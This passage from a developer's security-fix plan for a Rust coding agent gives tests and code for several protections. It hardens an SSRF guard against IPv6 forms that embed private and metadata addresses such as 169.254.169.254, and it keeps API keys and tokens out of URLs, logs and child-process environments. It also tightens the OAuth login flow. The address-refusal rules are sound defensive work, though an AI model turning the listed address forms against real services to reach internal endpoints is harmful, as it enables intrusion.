                return PermissionVerdict::Deny {
                    reason: "agent: pass per-task fields inside `tasks`, not beside it".into(),
                };
            }
        }
```

Add to `impl PermissionPolicy`:

```rust
    /// One verdict per task: any deny denies, any ask asks (the first ask's
    /// request is shown), and only a batch where every task is allowed runs
    /// without a prompt.
    fn decide_agent_batch(&self, tool_call_id: &str, tasks: &[Value], cwd: &Path) -> PermissionVerdict {
        let mut first_ask = None;
        for task in tasks {
            match self.decide(tool_call_id, "agent", task, cwd) {
                PermissionVerdict::Allow => {}
                deny @ PermissionVerdict::Deny { .. } => return deny,
                PermissionVerdict::Ask(request) => {
                    first_ask.get_or_insert(request);
                }
            }
        }
        match first_ask {
            Some(request) => PermissionVerdict::Ask(request),
            None => PermissionVerdict::Allow,
        }
    }
```

And the free function:

```rust
/// `Some(tasks)` when `args` is a batch whose only top-level key is `tasks`.
/// A batch with other top-level keys is ambiguous (the runner ignores them)
/// and returns `None` so `decide` can refuse it.
fn split_agent_tasks(args: &Value) -> Option<Vec<Value>> {
    let object = args.as_object()?;
    let tasks = object.get("tasks")?.as_array()?;
    if object.len() != 1 || tasks.is_empty() {
        return None;
    }
    Some(tasks.clone())
}
```

Each task object is evaluated as a plain single-agent call (it has no `tasks` key), so `subject_of` and `get_param_value` read its own `isolation` / `model`. The `tasks.first()` fallbacks at lines 617-625 and 1393-1398 become dead for `agent`; delete both so nothing else relies on "first task wins".

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-agent --lib permission::` and `cargo test -p davinci-agent --lib subagent::`
Expected: PASS. If a subagent test builds `{"isolation":..,"tasks":[..]}`, move `isolation` into each task in that fixture.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-agent/src/permission.rs
git commit -m "fix(permission): evaluate agent rules per task in a batch"
```

---

### Task 2.9: SSRF guard unwraps IPv4-embedding IPv6 prefixes and blocks 0.0.0.0/8

**Finding fixed:** davinci-agent 23.

**Files:**
- Modify: `crates/davinci-agent/src/web.rs:65-110`

- [ ] **Step 1: Write the failing tests**

Add to `web.rs` tests:

```rust
    #[test]
    fn ipv6_prefixes_that_embed_private_ipv4_are_refused() {
        use std::net::{IpAddr, Ipv6Addr};
        let cases = [
            // NAT64 64:ff9b::/96 -> 169.254.169.254
            Ipv6Addr::new(0x64, 0xff9b, 0, 0, 0, 0, 0xa9fe, 0xa9fe),
            // 6to4 2002::/16 -> 10.0.0.1
            Ipv6Addr::new(0x2002, 0x0a00, 0x0001, 0, 0, 0, 0, 0),
            // Teredo 2001:0::/32, client IPv4 is the last 32 bits inverted -> 127.0.0.1
            Ipv6Addr::new(0x2001, 0, 0, 0, 0, 0, !0x7f00u16, !0x0001u16),
        ];
        for ip in cases {
            assert!(ip_refusal(IpAddr::V6(ip)).is_some(), "{ip}");
        }
        assert!(ip_refusal(IpAddr::V6(Ipv6Addr::new(0x2606, 0x4700, 0, 0, 0, 0, 0, 0x1111))).is_none());
    }

    #[test]
    fn whole_zero_network_is_refused() {
        use std::net::{IpAddr, Ipv4Addr};
        assert!(ip_refusal(IpAddr::V4(Ipv4Addr::new(0, 1, 2, 3))).is_some());
    }
```

If the dispatcher at `web.rs:59-62` is named differently from `ip_refusal`, use that name.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-agent --lib web::tests`
Expected: the two new tests FAIL.

- [ ] **Step 3: Implement**

In `ipv4_refusal`, replace `if ip.is_unspecified()` with:

```rust
    if octets[0] == 0 {
        // 0.0.0.0/8 is "this network"; several stacks route it to localhost.
        Some("unspecified address")
```

In `ipv6_refusal`, after the `to_ipv4` block add:

```rust
    let segments = ip.segments();
    if let Some(embedded) = embedded_ipv4(segments) {
        if let Some(reason) = ipv4_refusal(embedded) {
            return Some(reason);
        }
    }
```

And add:

```rust
/// IPv4 carried inside NAT64 (64:ff9b::/96), 6to4 (2002::/16) and Teredo
/// (2001::/32) addresses. A resolver on a NAT64 network turns any of these
/// into the embedded IPv4 destination, so they are judged as that address.
fn embedded_ipv4(segments: [u16; 8]) -> Option<Ipv4Addr> {
    let from = |high: u16, low: u16| {
        Ipv4Addr::new((high >> 8) as u8, high as u8, (low >> 8) as u8, low as u8)
    };
    if segments[..6] == [0x64, 0xff9b, 0, 0, 0, 0] {
        return Some(from(segments[6], segments[7]));
    }
    if segments[0] == 0x2002 {
        return Some(from(segments[1], segments[2]));
    }
    if segments[0] == 0x2001 && segments[1] == 0 {
        return Some(from(!segments[6], !segments[7]));
    }
    None
}
```

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-agent --lib web::`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-agent/src/web.rs
git commit -m "fix(web): refuse NAT64, 6to4 and Teredo addresses that embed private IPv4"
```

---

### Task 2.10: The Google API key moves from the URL to a header, and traces drop query strings

**Finding fixed:** davinci-ai 5. `request_url` (`stream.rs:1507-1510`) puts the key in `?key=`; `stream.rs:719` traces the full URL; ureq transport errors include the URL, so the key reaches `error_message`, the session file and the retry logic. Also: `google-vertex` gets no auth header at all today (the `starts_with("google")` branch at `stream.rs:830` is empty).

**Files:**
- Modify: `crates/davinci-ai/src/stream.rs:719, 829-836, 1507-1510`
- Modify: `crates/davinci-ai/src/trace.rs` (add `redact_url`)

**Interfaces:**
- Produces: `crate::trace::redact_url(url: &str) -> String`

- [ ] **Step 1: Write the failing tests**

In `stream.rs` tests:

```rust
    #[test]
    fn google_api_key_is_a_header_not_a_query_parameter() {
        let model = load_builtin_models()
            .into_iter()
            .find(|m| m.api == "google-generative-ai")
            .expect("a built-in Gemini model");
        let auth = ResolvedAuth {
            api_key: Some("AIzaSECRET".into()),
            headers: Default::default(),
            source: "test".into(),
        };
        let url = request_url(&model, &auth);
        assert!(!url.contains("AIzaSECRET"), "{url}");
        assert!(!url.contains("key="), "{url}");
        let headers = collect_request_headers(&model, &auth, &StreamOptions::default());
        assert!(headers
            .iter()
            .any(|(name, value)| name == "x-goog-api-key" && value == "AIzaSECRET"));
    }
```

In `trace.rs` tests:

```rust
    #[test]
    fn redact_url_drops_the_query() {
        assert_eq!(
            redact_url("https://h/models/x:generateContent?key=SECRET&alt=sse"),
            "https://h/models/x:generateContent?<redacted>"
        );
        assert_eq!(redact_url("https://h/v1/messages"), "https://h/v1/messages");
    }
```

`ResolvedAuth` has exactly the fields `api_key`, `headers`, `source` (`auth.rs:76-80`). `StreamOptions::default()` must exist; if it does not, build it the way the existing `collect_request_headers` tests do.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-ai --lib google_api_key_is_a_header redact_url`
Expected: FAIL.

- [ ] **Step 3: Implement**

`stream.rs` `request_url`, Google arm:

```rust
        "google-generative-ai" => format!("{base}/models/{}:generateContent", model.id),
```

(`auth` stays a parameter; other arms use it.)

`stream.rs` header block (lines 829-836):

```rust
    if let Some(key) = &auth.api_key {
        if model.api == "google-generative-ai" {
            headers.push(("x-goog-api-key".into(), key.clone()));
        } else if model.api == "anthropic-messages" {
            headers.push(("x-api-key".into(), key.clone()));
            headers.push(("anthropic-version".into(), "2023-06-01".into()));
        } else {
            headers.push(("Authorization".into(), format!("Bearer {key}")));
        }
    }
```

This also gives `google-vertex` the `Authorization: Bearer <token>` it needs (a gcloud access token). Task 2.10 does not change Anthropic OAuth; Task 4.1 does.

`stream.rs:719`:

```rust
    crate::trace::log(&format!("sse post {}", crate::trace::redact_url(&url)));
```

`trace.rs`:

```rust
/// URLs are traced without their query string: providers and proxies put
/// keys, signatures and tokens there.
pub fn redact_url(url: &str) -> String {
    match url.split_once('?') {
        Some((base, _)) => format!("{base}?<redacted>"),
        None => url.to_string(),
    }
}
```

Grep the crate for other `trace::log(&format!(` calls that include a URL (`rg -n "trace::log\(&format!\(.*url" crates/davinci-ai/src`) and wrap each in `redact_url`.

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-ai`
Expected: PASS. Any Google fixture test that asserted `?key=` in the URL changes to assert the header.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-ai/src/stream.rs crates/davinci-ai/src/trace.rs
git commit -m "fix(ai): send Google API key as x-goog-api-key and redact traced URLs"
```

---

### Task 2.11: No secrets in OAuth error strings or SSE traces

**Finding fixed:** davinci-ai 23. `post_token_exchange` (`oauth_providers.rs:443-452`) embeds the full response `body=` in errors, so tokens under unexpected keys reach logs. `stream_decoder.rs:150-155` traces the first 200 characters of any SSE frame that fails to parse, which breaks the "trace only the size" rule at `stream.rs:385-386`.

**Files:**
- Modify: `crates/davinci-ai/src/oauth_providers.rs:440-455`
- Modify: `crates/davinci-ai/src/stream_decoder.rs:150-155`

**Interfaces:**
- Produces: `fn describe_token_body(body: &str) -> String` (private, in `oauth_providers.rs`)

- [ ] **Step 1: Write the failing test**

```rust
    #[test]
    fn token_error_description_never_includes_values() {
        let body = r#"{"weird_token":"sk-SECRET","error":"invalid_grant","error_description":"expired"}"#;
        let described = describe_token_body(body);
        assert!(!described.contains("sk-SECRET"), "{described}");
        assert!(described.contains("invalid_grant"));
        assert!(described.contains("expired"));
        assert!(described.contains("weird_token"));
        let not_json = describe_token_body("<html>proxy error sk-SECRET</html>");
        assert!(!not_json.contains("sk-SECRET"));
        assert!(not_json.contains("bytes"));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-ai --lib token_error_description`
Expected: FAIL to compile.

- [ ] **Step 3: Implement**

```rust
/// What an error message may say about a token endpoint reply: the OAuth
/// `error` / `error_description` strings (RFC 6749 5.2, never secret) and
/// the key names, never any other value.
fn describe_token_body(body: &str) -> String {
    let Ok(serde_json::Value::Object(map)) = serde_json::from_str::<serde_json::Value>(body) else {
        return format!("non-JSON body, {} bytes", body.len());
    };
    let text = |key: &str| map.get(key).and_then(|v| v.as_str()).unwrap_or("");
    let keys: Vec<&str> = map.keys().map(String::as_str).collect();
    format!(
        "error={:?}; error_description={:?}; keys=[{}]",
        text("error"),
        text("error_description"),
        keys.join(",")
    )
}
```

Replace every `body={body}` in `post_token_exchange` with `{}` + `describe_token_body(&body)`, e.g.:

```rust
        format!(
            "Token exchange returned invalid JSON. url={url}; {}; details={err}",
            describe_token_body(&body)
        )
```

`stream_decoder.rs:150-155`:

```rust
                if crate::trace::enabled() {
                    crate::trace::log(&format!(
                        "sse frame dropped: {err} ({} bytes)",
                        data.len()
                    ));
                }
```

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-ai`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-ai/src/oauth_providers.rs crates/davinci-ai/src/stream_decoder.rs
git commit -m "fix(ai): keep token values out of OAuth errors and SSE traces"
```

---

### Task 2.12: MCP stdio servers get a minimal environment

**Finding fixed:** davinci-ai/mcp 15. `StdioTransport::spawn` (`stdio.rs:51-59`) inherits the whole parent environment, so every third-party `npx` server receives `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `AWS_*`, `GITHUB_TOKEN`.

**Behavior (matches the MCP TypeScript SDK's `getDefaultEnvironment`):** the child gets only the inherited allowlist below, plus the server's `env` from config. Config values may reference the parent environment as `${NAME}`, so a user who wants the github server to see `GITHUB_TOKEN` writes `"env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}`. This is a breaking change for configs that relied on inheritance; the CHANGELOG entry in Step 5 says so.

**Files:**
- Modify: `crates/davinci-mcp/src/stdio.rs:44-60`
- Modify: `crates/davinci-mcp/src/config.rs:36-53` (expand `${NAME}` when building `TransportConfig`)

**Interfaces:**
- Produces: `pub const INHERITED_ENV: &[&str]` in `stdio.rs`; `fn expand_env(value: &str, lookup: impl Fn(&str) -> Option<String>) -> String` in `config.rs`

- [ ] **Step 1: Write the failing tests**

`config.rs` tests:

```rust
    #[test]
    fn env_values_expand_parent_variables() {
        let lookup = |name: &str| (name == "GITHUB_TOKEN").then(|| "ghp_x".to_string());
        assert_eq!(expand_env("${GITHUB_TOKEN}", lookup), "ghp_x");
        assert_eq!(expand_env("Bearer ${GITHUB_TOKEN}!", lookup), "Bearer ghp_x!");
        assert_eq!(expand_env("${MISSING}", lookup), "");
        assert_eq!(expand_env("plain $HOME", lookup), "plain $HOME");
    }
```

`stdio.rs` tests (unit-test the env builder, not a spawn):

```rust
    #[test]
    fn child_environment_is_allowlisted_plus_config() {
        let parent = vec![
            ("PATH".to_string(), "/bin".to_string()),
            ("OPENAI_API_KEY".to_string(), "sk-x".to_string()),
            ("HOME".to_string(), "/home/u".to_string()),
        ];
        let mut config = BTreeMap::new();
        config.insert("FOO".to_string(), "bar".to_string());
        let env = child_environment(parent.into_iter(), &config);
        assert_eq!(env.get("PATH").map(String::as_str), Some("/bin"));
        assert_eq!(env.get("FOO").map(String::as_str), Some("bar"));
        assert!(!env.contains_key("OPENAI_API_KEY"));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-mcp`
Expected: FAIL to compile.

- [ ] **Step 3: Implement**

`stdio.rs`:

```rust
/// Variables a stdio server inherits, the same list as the MCP TypeScript
/// SDK's `getDefaultEnvironment`. Everything else (API keys, cloud
/// credentials) must be passed explicitly in the server's `env`.
pub const INHERITED_ENV: &[&str] = if cfg!(windows) {
    &[
        "APPDATA", "HOMEDRIVE", "HOMEPATH", "LOCALAPPDATA", "PATH", "PATHEXT",
        "PROCESSOR_ARCHITECTURE", "SYSTEMDRIVE", "SYSTEMROOT", "TEMP", "TMP",
        "USERNAME", "USERPROFILE", "PROGRAMFILES", "COMSPEC",
    ]
} else {
    &["HOME", "LOGNAME", "PATH", "SHELL", "TERM", "USER", "LANG", "TMPDIR"]
};

fn child_environment(
    parent: impl Iterator<Item = (String, String)>,
    config: &BTreeMap<String, String>,
) -> BTreeMap<String, String> {
    let mut env: BTreeMap<String, String> = parent
        .filter(|(key, _)| INHERITED_ENV.iter().any(|name| name.eq_ignore_ascii_case(key)))
        .collect();
    env.extend(config.iter().map(|(k, v)| (k.clone(), v.clone())));
    env
}
```

In `spawn`, replace the `for (key, value) in env { cmd.env(key, value); }` loop with:

```rust
        cmd.env_clear();
        for (key, value) in child_environment(std::env::vars(), env) {
            cmd.env(key, value);
        }
```

`PATHEXT`, `COMSPEC` and `TMP` are added beyond the SDK list because `npx.cmd` needs them to run under `cmd.exe`; `LANG` and `TMPDIR` for the same reason on Unix.

`config.rs`:

```rust
/// `${NAME}` becomes the parent's value of NAME (empty when unset). A bare
/// `$NAME` is left alone, so values that legitimately contain `$` survive.
fn expand_env(value: &str, lookup: impl Fn(&str) -> Option<String>) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(start) = rest.find("${") {
        let Some(len) = rest[start + 2..].find('}') else {
            break;
        };
        out.push_str(&rest[..start]);
        let name = &rest[start + 2..start + 2 + len];
        out.push_str(&lookup(name).unwrap_or_default());
        rest = &rest[start + 2 + len + 1..];
    }
    out.push_str(rest);
    out
}
```

In `ServerConfig::transport`, for both arms, expand values:

```rust
        let expand = |map: &BTreeMap<String, String>| {
            map.iter()
                .map(|(k, v)| (k.clone(), expand_env(v, |name| std::env::var(name).ok())))
                .collect::<BTreeMap<_, _>>()
        };
```

and use `headers: expand(&self.headers)` / `env: expand(&self.env)`.

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-mcp` and `cargo test -p davinci-coding-agent --bin davinci mcp`
Expected: PASS. The MCP fixture server (`src/bin`) must not depend on inherited variables beyond the list; if a fixture test fails, pass what it needs through the test config's `env`.

- [ ] **Step 5: Document and commit**

Add under the next version heading in `CHANGELOG.md` (create the heading if absent):

```markdown
### Changed
- MCP stdio servers no longer inherit your whole environment. They receive PATH, HOME and a few OS variables, plus the `env` in their config. Pass secrets explicitly: `"env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" }`.
```

```bash
git add crates/davinci-mcp/src/stdio.rs crates/davinci-mcp/src/config.rs CHANGELOG.md
git commit -m "fix(mcp): start stdio servers with an allowlisted environment"
```

---

### Task 2.13: Graph tool results never carry file contents

**Finding fixed:** native-extensions 2. `graph_status` returns `"run": current` (`graph/mod.rs:753`) and its content is that JSON pretty-printed (`:856`). `GraphRun.continuation` holds `MutationBaseline.contents` (every tracked and non-ignored file up to 512 KB), so the model and the session file receive raw file bytes, including a committed `.env`. `graph_run` puts the same run in `details` (`:850`).

**Files:**
- Modify: `crates/davinci-coding-agent/src/native_extensions/graph/mod.rs:740-760, 846-851`

**Interfaces:**
- Produces: `fn run_for_display(run: &types::GraphRun) -> Value` and `fn strip_continuation(value: Value) -> Value` (both private)

`GraphRun.continuation` is `Option<GraphContinuation>` (`types.rs:694`); `GraphContinuation` (`continuation.rs:94`) holds `delivery`, `completed_delivery` (each a `DeliveryCheckpoint` with `baseline` / `attempt_baseline`), `saved_baseline` and `saved_attempt_baselines`, all `MutationBaseline` with `contents: BTreeMap<String, Vec<u8>>`. Building a whole `GraphRun` in a test is heavy, so the test targets the JSON-level helper.

- [ ] **Step 1: Write the failing test**

Add to the graph `mod.rs` tests:

```rust
    #[test]
    fn displayed_run_has_no_baseline_contents() {
        let secret: Vec<u8> = b"OPENAI_API_KEY=sk-secret".to_vec();
        let run = json!({
            "runId": "r1",
            "phase": "running",
            "continuation": {
                "savedBaseline": { "files": {}, "contents": { ".env": secret } }
            }
        });
        let shown = strip_continuation(run);
        assert!(shown.get("continuation").is_none());
        assert_eq!(shown["runId"], "r1");
        assert!(!shown.to_string().contains("115,107,45")); // "sk-" as bytes
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-coding-agent --lib graph::tests::displayed_run_has_no_baseline_contents`
Expected: FAIL to compile.

- [ ] **Step 3: Implement**

```rust
/// A run as tools and the session may see it. `continuation` holds full
/// file baselines for resume and rollback; it stays on disk only.
fn run_for_display(run: &types::GraphRun) -> Value {
    strip_continuation(serde_json::to_value(run).unwrap_or(Value::Null))
}

fn strip_continuation(mut value: Value) -> Value {
    if let Some(object) = value.as_object_mut() {
        object.remove("continuation");
    }
    value
}
```

In `status()` replace `"run": current,` with `"run": current.as_ref().map(run_for_display),`. In the `graph_run` arm replace `details: Some(json!({"graph": run})),` with `details: Some(json!({"graph": run_for_display(&run)})),`.

- [ ] **Step 4: Run to verify pass**

Run: `cargo test -p davinci-coding-agent --lib native_extensions::graph`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/davinci-coding-agent/src/native_extensions/graph/mod.rs
git commit -m "fix(graph): strip file baselines from graph tool results"
```

Task 8.1 removes file contents from checkpoints entirely; this task closes the leak now.

---

### Task 2.14: OAuth login: callback server survives stray requests, has a deadline, stays on loopback; Anthropic uses a random state; a pasted code reuses its PKCE

**Findings fixed:** davinci-ai 20 (single accept, no timeout, `PI_OAUTH_CALLBACK_HOST` can bind 0.0.0.0), 21 (Anthropic PKCE verifier sent as `state`, so it lands in browser history and Referer), and one found while planning: `main.rs:6686-6691` exchanges a pasted code with a **freshly generated** PKCE (`generate_pkce(uuid::Uuid::new_v4()...)`), which can never match the verifier the authorize URL used, so the paste path cannot succeed against a real provider. Confirm that last one against a real provider once before relying on it; the code path is certain, the provider's rejection is expected from RFC 7636.

**Files:**
- Modify: `crates/davinci-ai/src/oauth_callback.rs:319-372`
- Modify: `crates/davinci-ai/src/oauth_providers.rs:135-155, 403-420`
- Modify: `crates/davinci-coding-agent/src/main.rs:6685-6740`

**Interfaces:**
- Produces:
  - `CallbackServer::accept_until(&mut self, deadline: std::time::Instant) -> Result<CallbackResponse, String>`
  - `exchange_authorization_code(provider: &str, code: &str, pkce: Option<&Pkce>, state: Option<&str>) -> Result<OauthTokens, String>` (new `state` argument)
  - `davinci_ai::save_pending_login(agent_dir: &Path, provider: &str, request: &AuthorizeRequest) -> Result<(), String>` and `take_pending_login(agent_dir: &Path, provider: &str) -> Option<AuthorizeRequest>` (10-minute lifetime, written with `atomic_write_private`)

- [ ] **Step 1: Write the failing tests**

`oauth_callback.rs` tests:

```rust
    #[test]
    fn stray_requests_do_not_consume_the_callback() {
        let mut server =
            CallbackServer::bind("127.0.0.1", 0, CallbackProvider::OpenAiCodex, "state-1".into())
                .unwrap();
        let addr = server.local_addr().unwrap();
        let client = std::thread::spawn(move || {
            for target in ["/favicon.ico", "/auth/callback?code=real&state=state-1"] {
                let mut stream = std::net::TcpStream::connect(addr).unwrap();
                use std::io::{Read, Write};
                write!(stream, "GET {target} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n").unwrap();
                let mut sink = Vec::new();
                let _ = stream.read_to_end(&mut sink);
            }
        });
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        let response = server.accept_until(deadline).unwrap();
        client.join().unwrap();
        assert_eq!(response.code.as_deref(), Some("real"));
    }

    #[test]
    fn accept_until_times_out() {
        let mut server =
            CallbackServer::bind("127.0.0.1", 0, CallbackProvider::OpenAiCodex, "s".into()).unwrap();
        let deadline = std::time::Instant::now() + std::time::Duration::from_millis(200);
        assert!(server.accept_until(deadline).is_err());
    }

    #[test]
    fn non_loopback_bind_is_refused() {
        assert!(CallbackServer::bind("0.0.0.0", 0, CallbackProvider::OpenAiCodex, "s".into()).is_err());
    }
```

Use the Codex callback path the existing tests use (`/auth/callback` above must match `CallbackProvider::OpenAiCodex.path()`).

`oauth_providers.rs` tests:

```rust
    #[test]
    fn anthropic_state_is_not_the_pkce_verifier() {
        let pkce = generate_pkce(b"0123456789abcdef0123456789abcdef");
        let request = authorize_request("anthropic", &pkce, "random-state").unwrap();
        assert_eq!(request.state.as_deref(), Some("random-state"));
        assert!(!request.url.contains(&pkce.verifier));
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test -p davinci-ai --lib oauth`
Expected: the new tests FAIL (`accept_until` missing; Anthropic URL contains the verifier).

- [ ] **Step 3: Implement the callback server**

In `CallbackServer::bind`, before binding:

```rust
        let ip: std::net::IpAddr = host
            .parse()
            .map_err(|_| format!("OAuth callback host must be an IP address, got {host}"))?;
        if !ip.is_loopback() {
            return Err(format!("OAuth callback host must be loopback, got {host}"));
        }
```

Add:

```rust
    /// Serve requests until one carries an authorization code or `deadline`
    /// passes. Favicon fetches, browser preconnects and wrong paths get
    /// their response and do not end the wait.
    pub fn accept_until(&mut self, deadline: std::time::Instant) -> Result<CallbackResponse, String> {
        self.listener.set_nonblocking(true).map_err(|err| err.to_string())?;
        loop {
            match self.listener.accept() {
                Ok((stream, _)) => {
                    stream.set_nonblocking(false).map_err(|err| err.to_string())?;
                    let response = self.serve(stream)?;
                    if response.code.is_some() {
                        return Ok(response);
                    }
                }
                Err(err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                    if std::time::Instant::now() >= deadline {
                        return Err("Timed out waiting for the browser login callback.".into());
                    }
                    std::thread::sleep(std::time::Duration::from_millis(50));
                }
                Err(err) => return Err(format!("OAuth callback accept: {err}")),
            }
        }
    }
```

Keep `accept_one` for existing callers/tests or delete it if `accept_until` replaces every use.

- [ ] **Step 4: Implement the random Anthropic state**

In `authorize_request`, Anthropic arm: `.append_pair("state", state)` and `state: Some(state.to_string())`.

Change `exchange_authorization_code` to take `state: Option<&str>` and pass it to `token_exchange_request` (falling back to the verifier only when `None`, for pasted codes from the older `code#verifier` format). Update the two tests at `oauth_providers.rs:554` and `:591` to pass `None`.

- [ ] **Step 5: Implement pending logins and the CLI flow**

Add to `oauth_providers.rs`:

```rust
const PENDING_LOGIN_TTL_MS: u64 = 10 * 60 * 1000;

#[derive(serde::Serialize, serde::Deserialize)]
struct PendingLogin {
    created_ms: u64,
    request: AuthorizeRequest,
}

fn pending_path(agent_dir: &std::path::Path, provider: &str) -> std::path::PathBuf {
    agent_dir.join("oauth-pending").join(format!("{provider}.json"))
}

/// Keep the PKCE verifier and state of the URL we printed, so a code the
/// user pastes in a later invocation is exchanged with the matching verifier.
pub fn save_pending_login(
    agent_dir: &std::path::Path,
    provider: &str,
    request: &AuthorizeRequest,
) -> Result<(), String> {
    let pending = PendingLogin {
        created_ms: crate::models_store::now_ms(),
        request: request.clone(),
    };
    let bytes = serde_json::to_vec(&pending).map_err(|err| err.to_string())?;
    davinci_sys::fs::atomic_write_private(&pending_path(agent_dir, provider), &bytes)
        .map_err(|err| err.to_string())
}

pub fn take_pending_login(agent_dir: &std::path::Path, provider: &str) -> Option<AuthorizeRequest> {
    let path = pending_path(agent_dir, provider);
    let raw = std::fs::read(&path).ok()?;
    let _ = std::fs::remove_file(&path);
    let pending: PendingLogin = serde_json::from_slice(&raw).ok()?;
    let age = crate::models_store::now_ms().saturating_sub(pending.created_ms);
    (age <= PENDING_LOGIN_TTL_MS).then_some(pending.request)
}
```

`AuthorizeRequest` and `Pkce` need `#[derive(Clone, serde::Serialize, serde::Deserialize)]`; add the derives if missing. Add `davinci-sys = { path = "../davinci-sys" }` to `crates/davinci-ai/Cargo.toml`. Re-export both functions from `crates/davinci-ai/src/lib.rs` next to `exchange_authorization_code`.

In `main.rs` login:
- Paste path (`looks_like_oauth_input`): replace the fresh `generate_pkce` with

```rust
            let (code, pasted_state) = davinci_ai::parse_authorization_input(key);
            let code = code.ok_or_else(|| "Missing authorization code.".to_string())?;
            let pending = davinci_ai::take_pending_login(&default_agent_dir(), provider)
                .ok_or_else(|| format!("No login in progress for {provider}. Run /login {provider} first, then paste the redirect URL."))?;
            if let (Some(expected), Some(got)) = (pending.state.as_deref(), pasted_state.as_deref()) {
                if expected != got {
                    return Err("The pasted login does not match the one started here (state mismatch).".into());
                }
            }
            let tokens = davinci_ai::exchange_authorization_code(
                provider,
                &code,
                pending.pkce.as_ref(),
                pending.state.as_deref(),
            )?;
```

- Where the URL is printed without waiting (`println!("{}", request.url);` at the end of the `fresh_authorize_request` block), call `davinci_ai::save_pending_login(&default_agent_dir(), provider, &request)?;` first.
- Callback path: `server.accept_until(Instant::now() + Duration::from_secs(300))` instead of `accept_one()`, and pass `request.state.as_deref()` to `exchange_authorization_code`.
- `PI_OAUTH_CODE` path: pass `request.state.as_deref()`.

- [ ] **Step 6: Run to verify pass**

Run: `cargo test -p davinci-ai` and `cargo test -p davinci-coding-agent --bin davinci login oauth`
Expected: PASS. The `main.rs:11202` test sets `PI_OAUTH_CODE`; it still passes because that path keeps the request it just built.

- [ ] **Step 7: Commit**

```bash
git add crates/davinci-ai crates/davinci-coding-agent/src/main.rs Cargo.lock
git commit -m "fix(oauth): loopback-only callback with deadline, random Anthropic state, reuse PKCE for pasted codes"
```

---

### Task 2.15: Credential-affecting test hooks compile only into test builds

**Finding fixed (scoped):** davinci-ai 22 and native-extensions 24, for the hooks that mint or redirect **credentials** or replace a model:
- `pi-fixture-` token prefix and `PI_OAUTH_FIXTURE` (`auth.rs:205-219`, `oauth_providers.rs:384, 410`)
- `PI_OAUTH_REFRESH_URL` (`auth.rs:220`), posts the refresh token to any URL
- `PI_OAUTH_TOKEN_URL` (`oauth_providers.rs:424`)
- `PI_MCP_FIXTURE` (`davinci-mcp/src/http.rs:257`)
- `PI_SECURITY_SCAN_FIXTURE` / `PI_SECURITY_SCAN_HOLD` (`main.rs:7866`, `security_scan/worker.rs:43-72`)

The `pi-fixture-` prefix is data-controlled (a value in `auth.json`), which is why this set goes first. The other ~80 `PI_*_REPLY` / `PI_*_CMD` stubs stay; they need control of the environment, which already means control of the process. They are listed as deferred in `00-index.md`.

**Mechanism:** a cargo feature `test-fixtures` per crate. Each crate enables its own feature for its integration tests through a self dev-dependency, and downstream crates enable it through their dev-dependencies. With `resolver = "2"`, dev-dependency features are active only while test targets are built, so `cargo build --release` never contains the hooks, and the `davinci` binary built by `cargo test` (used by e2e tests through `CARGO_BIN_EXE_davinci`) does.

**Files:**
- Modify: `crates/davinci-ai/Cargo.toml`, `crates/davinci-mcp/Cargo.toml`, `crates/davinci-coding-agent/Cargo.toml`
- Create: `crates/davinci-ai/src/fixtures.rs`, `crates/davinci-mcp/src/fixtures.rs`
- Modify: the call sites listed above

- [ ] **Step 1: Add the features**

`crates/davinci-ai/Cargo.toml`:

```toml
[features]
test-fixtures = []

[dev-dependencies]
davinci-ai = { path = ".", features = ["test-fixtures"] }
```

(merge with the existing `[dev-dependencies]` table). Same pattern for `davinci-mcp`. In `crates/davinci-coding-agent/Cargo.toml`:

```toml
[features]
default = []
interaction-testing = []
test-fixtures = ["davinci-ai/test-fixtures", "davinci-mcp/test-fixtures"]

[dev-dependencies]
tempfile.workspace = true
davinci-coding-agent = { path = ".", features = ["test-fixtures"] }
```

`crates/davinci-ai/src/fixtures.rs`:

```rust
//! Test-only credential hooks. Compiled out of release builds; see the
//! `test-fixtures` feature in Cargo.toml.

pub const fn enabled() -> bool {
    cfg!(any(test, feature = "test-fixtures"))
}
```

Declare `pub mod fixtures;` in `lib.rs`. Same file in `davinci-mcp`. In coding-agent add `fn fixtures_enabled() -> bool { cfg!(any(test, feature = "test-fixtures")) }` next to the security-scan fixture reads.

- [ ] **Step 2: Write the failing test**

`crates/davinci-ai/src/auth.rs` tests:

```rust
    #[test]
    fn fixture_hooks_are_on_in_test_builds() {
        assert!(crate::fixtures::enabled());
    }
```

and a release-shape check in CI (Step 5), because a unit test always runs with `cfg(test)`.

- [ ] **Step 3: Gate each site**

Each read becomes conditional, for example `auth.rs:205`:

```rust
        let fixture = crate::fixtures::enabled()
            && (refresh.starts_with("pi-fixture-")
                || matches!(
                    std::env::var("PI_OAUTH_FIXTURE").as_deref(),
                    Ok("1") | Ok("true")
                ));
```

`auth.rs:220`:

```rust
        let refresh_url = crate::fixtures::enabled()
            .then(|| std::env::var("PI_OAUTH_REFRESH_URL").ok())
            .flatten();
        if let Some(url) = refresh_url {
```

`oauth_providers.rs:384` and `:410`: prefix the condition with `crate::fixtures::enabled() && (...)`. `oauth_providers.rs:424`:

```rust
    let url = crate::fixtures::enabled()
